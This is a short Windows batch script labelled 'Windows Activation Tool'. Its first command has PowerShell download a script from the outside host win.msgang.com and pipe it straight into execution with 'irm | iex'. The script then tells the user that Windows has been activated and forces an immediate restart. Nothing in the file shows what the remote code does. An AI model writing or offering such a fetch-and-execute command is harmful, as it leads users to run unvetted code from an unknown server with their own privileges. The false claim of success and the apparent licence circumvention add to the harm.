@echo off
powershell -NoProfile -Command "irm win.msgang.com | iex"

:start
title Windows Activation Tool
echo Windows Have Been Activated Succesfully
echo Press any Key To restart computer
pause
shutdown /r /f /t 0